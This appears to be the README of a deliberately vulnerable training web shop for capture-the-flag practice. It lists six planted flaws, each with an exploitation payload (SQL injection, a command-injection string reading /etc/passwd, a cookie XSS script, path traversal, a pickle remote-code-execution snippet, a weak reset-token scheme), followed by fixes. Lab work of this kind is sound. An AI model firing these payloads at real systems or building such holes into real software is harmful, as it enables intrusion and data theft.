# VulnShop - Vulnerable E-commerce Platform

A deliberately vulnerable e-commerce platform for CTF challenges and security testing practice.

## Setup

1. Install dependencies:
```bash
pip install -r requirements.txt
```

2. Initialize the database:
```bash
python app.py
```

3. Access the application at `http://localhost:5000`

Default admin credentials:
- Username: admin
- Password: admin123

## Vulnerabilities

### 1. SQL Injection in Product Search
**Location**: `/search` endpoint
**Vulnerability**: The search query is directly concatenated into the SQL statement without proper sanitization.
**Exploitation**:
```sql
' UNION SELECT 1,2,3,4,5,6 FROM user--
```
This will reveal user information from the database.

### 2. Command Injection in Image Processing
**Location**: `/process-image` endpoint
**Vulnerability**: User input is directly used in a shell command without proper sanitization.
**Exploitation**:
```bash
; cat /etc/passwd
```
This will execute arbitrary commands on the server.

### 3. XSS in Product Reviews
**Location**: `/add-review/<product_id>` endpoint
**Vulnerability**: User input is directly rendered in HTML without proper escaping.
**Exploitation**:
```html
<script>alert(document.cookie)</script>
```
This will execute arbitrary JavaScript in the context of the page.

### 4. Directory Traversal in Product Images
**Location**: `/product-image/<filename>` endpoint
**Vulnerability**: No path sanitization when accessing files.
**Exploitation**:
```
../../../etc/passwd
```
This will allow access to files outside the intended directory.

### 5. Insecure Deserialization in Cart
**Location**: `/update-cart` endpoint
**Vulnerability**: User input is deserialized without proper validation.
**Exploitation**:
```python
import pickle
import base64

class RCE:
    def __reduce__(self):
        return (os.system, ('cat /etc/passwd',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
```
Send this payload in the `cart` parameter.

### 6. Weak Password Reset
**Location**: `/reset-password` endpoint
**Vulnerability**: Weak token generation using base64 encoding of email.
**Exploitation**:
1. Request password reset for a user
2. The token is simply base64 encoded email
3. Decode the token to get the email
4. Use the token to reset the password

## Security Best Practices

To fix these vulnerabilities:

1. SQL Injection:
   - Use parameterized queries
   - Implement proper input validation
   - Use ORM methods instead of raw SQL

2. Command Injection:
   - Avoid using shell=True
   - Use subprocess.run with a list of arguments
   - Implement proper input validation

3. XSS:
   - Use proper HTML escaping
   - Implement Content Security Policy
   - Use template escaping

4. Directory Traversal:
   - Implement proper path sanitization
   - Use os.path.abspath and os.path.normpath
   - Validate file paths

5. Insecure Deserialization:
   - Avoid using pickle for user input
   - Use JSON or other safe serialization formats
   - Implement proper input validation

6. Weak Password Reset:
   - Use cryptographically secure random tokens
   - Implement token expiration
   - Use proper token storage

## Disclaimer

This application is intentionally vulnerable and should only be used for educational purposes in controlled environments. Do not deploy this application in production or expose it to the internet. 